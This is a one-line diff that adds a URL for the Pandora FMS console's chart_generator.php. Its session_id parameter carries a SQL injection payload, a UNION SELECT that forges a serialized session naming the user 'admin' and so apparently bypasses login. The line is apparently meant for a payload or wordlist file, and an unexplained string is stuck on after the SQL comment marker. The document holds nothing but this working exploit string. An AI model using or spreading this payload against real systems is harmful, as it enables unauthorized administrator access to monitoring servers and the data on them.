@@ -1,0 +1,1 @@
+/pandora_console/include/chart_generator.php?session_id=' union select 1,2,'id_usuario|s:5:"admin";' as data -- -HotelBabylon23
